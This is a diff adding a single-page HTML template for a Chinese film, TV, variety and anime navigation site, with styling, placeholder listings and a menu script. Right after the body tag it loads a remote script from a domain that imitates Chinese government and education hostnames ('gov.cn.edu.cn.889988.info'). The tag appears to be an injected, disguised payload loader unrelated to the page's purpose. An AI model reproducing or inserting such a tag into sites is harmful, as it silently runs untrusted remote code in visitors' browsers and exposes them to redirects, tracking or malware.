@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>我的电影网 - 高清电影/电视剧/综艺动漫在线观看</title>
+<meta name="description" content="我的电影网（wodedianyingwang-h5）提供最新电影、热播电视剧、综艺、动漫高清在线观看，移动端自适应，页面简洁流畅，适合必应搜索收录。">
+<meta name="keywords" content="我的电影网, wodedianyingwang-h5, 电影, 电视剧, 综艺, 动漫, 在线观看, 高清影视">
+<meta name="author" content="我的电影网">
+<meta name="robots" content="index, follow">
+<!-- 不生成 robots.txt / sitemap.xml，按需求仅做单页静态站 -->
+<style>
+:root{
+  --bg:#0b1020;
+  --bg-soft:#121a33;
+  --card:#172241;
+  --line:#243356;
+  --primary:#ff5a5f;
+  --primary2:#ffb020;
+  --text:#e8edf7;
+  --muted:#9fb0d0;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:var(--primary);text-decoration:none}
+a:hover{color:var(--primary2)}
+
+/* 顶部导航 */
+.site-header{
+  position:sticky;top:0;z-index:999;
+  background:rgba(11,16,32,.92);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.nav{
+  max-width:1180px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  height:58px;padding:0 16px;
+}
+.brand{font-size:20px;font-weight:800;letter-spacing:.5px}
+.brand b{color:var(--primary)}
+.brand i{color:var(--primary2);font-style:normal}
+.menu{
+  display:flex;gap:18px;list-style:none;
+}
+.menu a{
+  color:var(--text);font-size:15px;padding:6px 2px;
+  border-bottom:2px solid transparent;
+}
+.menu a:hover{border-bottom-color:var(--primary)}
+.hamburger{
+  display:none;flex-direction:column;gap:5px;cursor:pointer;
+}
+.hamburger span{width:24px;height:2px;background:var(--text);border-radius:2px}
+
+/* Hero */
+.hero{
+  max-width:1180px;margin:0 auto;
+  padding:72px 16px 56px;text-align:center;
+}
+.hero h1{
+  font-size:clamp(28px,6vw,46px);line-height:1.2;margin-bottom:16px;
+}
+.hero h1 em{color:var(--primary);font-style:normal}
+.hero p{
+  color:var(--muted);max-width:640px;margin:0 auto 26px;font-size:16px;
+}
+.btn{
+  display:inline-block;
+  background:linear-gradient(135deg,var(--primary),var(--primary2));
+  color:#fff;font-weight:700;
+  padding:13px 34px;border-radius:999px;
+  box-shadow:0 10px 30px rgba(255,90,95,.35);
+}
+.btn:hover{color:#fff;transform:translateY(-2px)}
+
+/* 区块 */
+.wrap{max-width:1180px;margin:0 auto;padding:56px 16px}
+.sec-title{
+  font-size:clamp(22px,4vw,30px);margin-bottom:28px;
+  display:flex;align-items:center;gap:10px;
+}
+.sec-title::before{
+  content:"";width:6px;height:24px;border-radius:4px;
+  background:linear-gradient(var(--primary),var(--primary2));
+}
+.muted{color:var(--muted)}
+
+/* 栏目1：电影网格 */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+  gap:16px;
+}
+.film{
+  background:var(--card);border:1px solid var(--line);
+  border-radius:14px;overflow:hidden;transition:.25s;
+}
+.film:hover{transform:translateY(-4px);border-color:var(--primary)}
+.poster{
+  height:210px;display:flex;align-items:center;justify-content:center;
+  font-size:46px;
+  background:linear-gradient(135deg,#1d294d,#26365f);
+}
+.film h3{font-size:15px;padding:10px 12px 2px}
+.film span{display:block;padding:0 12px 12px;color:var(--muted);font-size:12px}
+
+/* 栏目2：电视剧列表 */
+.tv-row{
+  display:flex;gap:14px;background:var(--bg-soft);
+  border:1px solid var(--line);border-radius:14px;
+  padding:14px;margin-bottom:14px;align-items:center;
+}
+.tv-ico{
+  width:84px;height:84px;flex:0 0 84px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;font-size:34px;
+  background:linear-gradient(135deg,#2a3b6b,#3a2b6b);
+}
+.tv-row h3{font-size:17px}
+.tv-row p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* 栏目3：综艺/动漫卡片 */
+.ent{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px;
+}
+.ent-card{
+  background:linear-gradient(180deg,var(--card),var(--bg-soft));
+  border:1px solid var(--line);border-radius:16px;padding:22px;text-align:center;
+}
+.ent-card .emoji{font-size:40px}
+.ent-card h3{margin:10px 0 6px;font-size:18px}
+.ent-card p{color:var(--muted);font-size:14px;min-height:42px}
+.tag{
+  display:inline-block;margin-top:12px;padding:7px 18px;
+  border:1px solid var(--primary);border-radius:999px;font-size:13px;color:var(--primary);
+}
+
+/* 栏目4：排行榜 */
+.rank{
+  background:var(--bg-soft);border:1px solid var(--line);border-radius:16px;padding:10px 18px;
+}
+.rank li{
+  list-style:none;display:flex;align-items:center;gap:14px;
+  padding:14px 0;border-bottom:1px dashed var(--line);
+}
+.rank li:last-child{border-bottom:none}
+.no{
+  width:30px;height:30px;border-radius:50%;flex:0 0 30px;
+  display:flex;align-items:center;justify-content:center;font-weight:800;
+  background:var(--line);color:var(--text);
+}
+.no.hot{background:linear-gradient(135deg,var(--primary),var(--primary2));color:#fff}
+.rank b{font-size:15px}
+.rank small{color:var(--muted);display:block;margin-top:2px}
+
+/* 栏目5：关于 */
+.about{
+  background:linear-gradient(135deg,#121a33,#0b1020);
+  border:1px solid var(--line);border-radius:18px;padding:36px 24px;text-align:center;
+}
+.about h2{font-size:24px;margin-bottom:14px}
+.about p{max-width:720px;margin:0 auto 12px;color:var(--muted)}
+.link-row{margin-top:18px;display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.link-row a{color:var(--primary2);font-size:14px}
+
+/* 页脚 */
+.foot{
+  border-top:1px solid var(--line);padding:28px 16px;text-align:center;color:var(--muted);font-size:13px;
+}
+.foot a{color:var(--muted);margin:0 6px}
+
+/* 移动端 */
+@media(max-width:768px){
+  .menu{
+    display:none;position:absolute;top:58px;left:0;right:0;
+    background:var(--bg-soft);flex-direction:column;padding:14px 18px;gap:12px;
+    border-bottom:1px solid var(--line);
+  }
+  .menu.open{display:flex}
+  .hamburger{display:flex}
+  .tv-row{flex-direction:column;text-align:center}
+  .tv-ico{width:100%;height:120px;flex:none}
+}
+@media(max-width:420px){
+  .grid{grid-template-columns:repeat(2,1fr);gap:10px}
+  .poster{height:160px;font-size:36px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header">
+  <div class="nav">
+    <div class="brand">我的<b>电影</b><i>网</i></div>
+    <ul class="menu" id="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movie">电影</a></li>
+      <li><a href="#tv">电视剧</a></li>
+      <li><a href="#ent">综艺动漫</a></li>
+      <li><a href="#rank">排行榜</a></li>
+      <li><a href="#about">关于</a></li>
+    </ul>
+    <div class="hamburger" id="ham">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <h1>我的电影网：<em>好看电影</em>一站看完</h1>
+  <p>我的电影网（wodedianyingwang-h5）聚合最新电影、热播剧、综艺与动漫资源导航，界面清爽、手机电脑都能看。</p>
+  <a class="btn" href="#movie">开始看片</a>
+</section>
+
+<section class="wrap" id="movie">
+  <h2 class="sec-title">最新电影</h2>
+  <div class="grid">
+    <article class="film"><div class="poster">🎬</div><h3>星海征途</h3><span>科幻 / 2026</span></article>
+    <article class="film"><div class="poster">🎭</div><h3>人间烟火</h3><span>剧情 / 2026</span></article>
+    <article class="film"><div class="poster">🚓</div><h3>极速追凶</h3><span>动作 / 2025</span></article>
+    <article class="film"><div class="poster">👻</div><h3>夜半回声</h3><span>悬疑 / 2026</span></article>
+    <article class="film"><div class="poster">❤️</div><h3>再次相遇</h3><span>爱情 / 2025</span></article>
+    <article class="film"><div class="poster">🐉</div><h3>山海异闻</h3><span>奇幻 / 2026</span></article>
+  </div>
+</section>
+
+<section class="wrap" id="tv" style="padding-top:0">
+  <h2 class="sec-title">热播电视剧</h2>
+  <div class="tv-row">
+    <div class="tv-ico">📺</div>
+    <div>
+      <h3>长安十二时辰 2</h3>
+      <p>古装悬疑大剧，张小敬再入长安，权谋与生死一线间。</p>
+    </div>
+  </div>
+  <div class="tv-row">
+    <div class="tv-ico">🩺</div>
+    <div>
+      <h3>急诊凌晨</h3>
+      <p>现实医疗群像剧，一夜之间见证人生百态与医者初心。</p>
+    </div>
+  </div>
+  <div class="tv-row">
+    <div class="tv-ico">💼</div>
+    <div>
+      <h3>职场进化论</h3>
+      <p>都市职场轻喜剧，新人逆袭、老板反被拿捏。</p>
+    </div>
+  </div>
+  <div class="tv-row">
+    <div class="tv-ico">⚔️</div>
+    <div>
+      <h3>剑来风云</h3>
+      <p>仙侠群像改编，少年持剑走江湖，恩怨未央。</p>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="ent" style="padding-top:0">
+  <h2 class="sec-title">综艺 · 动漫</h2>
+  <div class="ent">
+    <div class="ent-card">
+      <div class="emoji">🎤</div>
+      <h3>周末欢唱会</h3>
+      <p>明星翻唱竞演，现场乐队 + 观众投票，每期金曲不断。</p>
+      <a class="tag" href="#">观看综艺</a>
+    </div>
+    <div class="ent-card">
+      <div class="emoji">🧙</div>
+      <h3>幻境行者 第二季</h3>
+      <p>国产玄幻动画，世界观再扩张，打斗分镜全面升级。</p>
+      <a class="tag" href="#">观看动漫</a>
+    </div>
+    <div class="ent-card">
+      <div class="emoji">🍜</div>
+      <h3>街头味道</h3>
+      <p>美食寻味真人秀，从夜市到老巷，一口人间烟火气。</p>
+      <a class="tag" href="#">观看综艺</a>
+    </div>
+    <div class="ent-card">
+      <div class="emoji">🤖</div>
+      <h3>机械纪元</h3>
+      <p>末日机甲动画，少年与残存 AI 共同寻找新文明。</p>
+      <a class="tag" href="#">观看动漫</a>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="rank" style="padding-top:0">
+  <h2 class="sec-title">热门排行榜</h2>
+  <ul class="rank">
+    <li><div class="no hot">1</div><div><b>星海征途</b><small>电影 · 热度 9,920,000</small></div></li>
+    <li><div class="no hot">2</div><div><b>长安十二时辰 2</b><small>电视剧 · 热度 9,710,000</small></div></li>
+    <li><div class="no hot">3</div><div><b>幻境行者 第二季</b><small>动漫 · 热度 9,540,000</small></div></li>
+    <li><div class="no">4</div><div><b>急诊凌晨</b><small>电视剧 · 热度 8,880,000</small></div></li>
+    <li><div class="no">5</div><div><b>周末欢唱会</b><small>综艺 · 热度 8,650,000</small></div></li>
+    <li><div class="no">6</div><div><b>夜半回声</b><small>电影 · 热度 8,310,000</small></div></li>
+    <li><div class="no">7</div><div><b>机械纪元</b><small>动漫 · 热度 8,050,000</small></div></li>
+  </ul>
+</section>
+
+<section class="wrap" id="about" style="padding-top:0">
+  <div class="about">
+    <h2>关于 我的电影网</h2>
+    <p>我的电影网（wodedianyingwang-h5）是一个静态影视导航单页，聚焦“电影 / 电视剧 / 综艺 / 动漫”四类内容，适合新手建站、GitHub Pages 部署与搜索引擎基础收录。</p>
+    <p>本站仅做资源导航与排版演示，不存储视频文件；内容来自公开网络，如有侵权可联系移除。</p>
+    <div class="link-row">
+      <a href="#">免责声明</a>
+      <a href="#">联系我们</a>
+      <a href="#">友情链接</a>
+      <a href="#">提交资源</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <p>© 2026 我的电影网（wodedianyingwang-h5）</p>
+  <p>
+    <a href="#home">首页</a>|
+    <a href="#movie">电影</a>|
+    <a href="#tv">电视剧</a>|
+    <a href="#ent">综艺动漫</a>|
+    <a href="#rank">排行榜</a>
+  </p>
+  <p>官网地址：<a href="https://wodedianyingwang-h5.github.io">https://wodedianyingwang-h5.github.io</a></p>
+</footer>
+
+<script>
+document.getElementById('ham').addEventListener('click',function(){
+  document.getElementById('menu').classList.toggle('open');
+});
+document.querySelectorAll('#menu a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('menu').classList.remove('open');
+  });
+});
+</script>
+
+</body>
+</html>
